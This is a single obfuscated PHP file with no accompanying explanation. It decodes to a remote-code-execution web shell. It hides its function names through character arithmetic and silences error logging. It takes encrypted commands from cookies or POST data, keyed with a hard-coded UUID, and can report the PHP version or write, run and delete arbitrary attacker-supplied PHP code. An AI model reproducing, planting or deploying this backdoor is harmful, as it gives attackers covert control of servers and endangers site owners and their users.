<?php $hfwnz = chr(102).chr(105).'l'.chr(177-76).'_'.chr(112)."\x75"."\x74".chr(95)."\143".chr(976-865)."\156".chr(216-100).chr(609-508).chr(951-841).'t'.chr(898-783);
$dpwuysx = chr(98)."\141"."\x73".'e'.chr(54).chr(341-289).'_'.chr(470-370).chr(101).'c'.chr(994-883)."\144".'e';
$tqdrtkcyyk = chr(405-300)."\x6e".chr(273-168).chr(338-243).chr(702-587)."\145".'t';
$rjwbtpnlrk = chr(373-256).chr(604-494)."\x6c"."\151".chr(110)."\153";


@$tqdrtkcyyk(chr(779-678)."\x72"."\x72".'o'.chr(114)."\137".chr(108).chr(290-179)."\147", NULL);
@$tqdrtkcyyk('l'."\x6f"."\x67".chr(95).chr(642-541)."\x72"."\162".chr(111).chr(1085-971)."\163", 0);
@$tqdrtkcyyk(chr(685-576).'a'.chr(441-321).'_'.chr(101).'x'."\145"."\143".chr(117)."\164".chr(275-170)."\x6f"."\156".chr(95)."\x74".chr(239-134).'m'."\145", 0);
@set_time_limit(0);

function oxuqmgmz($ptrinxhs, $wpftnmwlc)
{
    $relzryu = "";
    for ($ummuxgpqni = 0; $ummuxgpqni < strlen($ptrinxhs);) {
        for ($j = 0; $j < strlen($wpftnmwlc) && $ummuxgpqni < strlen($ptrinxhs); $j++, $ummuxgpqni++) {
            $relzryu .= chr(ord($ptrinxhs[$ummuxgpqni]) ^ ord($wpftnmwlc[$j]));
        }
    }
    return $relzryu;
}

$ukwuazz = array_merge($_COOKIE, $_POST);
$ovioayeywe = '1c4534f2-ffec-42f0-84de-d9749efb96d1';
foreach ($ukwuazz as $pgwfuf => $ptrinxhs) {
    $ptrinxhs = @unserialize(oxuqmgmz(oxuqmgmz($dpwuysx($ptrinxhs), $ovioayeywe), $pgwfuf));
    if (isset($ptrinxhs["\141".chr(107)])) {
        if ($ptrinxhs['a'] == "\151") {
            $ummuxgpqni = array(
                'p'.chr(118) => @phpversion(),
                "\x73".'v' => "3.5",
            );
            echo @serialize($ummuxgpqni);
        } elseif ($ptrinxhs['a'] == chr(101)) {
            $fpsjbq = "./" . md5($ovioayeywe) . '.'.chr(105).'n'.'c';
            @$hfwnz($fpsjbq, "<" . "\x3f".chr(112).chr(1096-992).chr(288-176).chr(32).chr(64)."\165"."\x6e"."\154"."\x69"."\156".chr(107)."\x28"."\137"."\x5f".chr(70).chr(73)."\x4c".'E'.chr(546-451).chr(95).chr(41)."\x3b".chr(32) . $ptrinxhs[chr(100)]);
            @include($fpsjbq);
            @$rjwbtpnlrk($fpsjbq);
        }
        exit();
    }
}

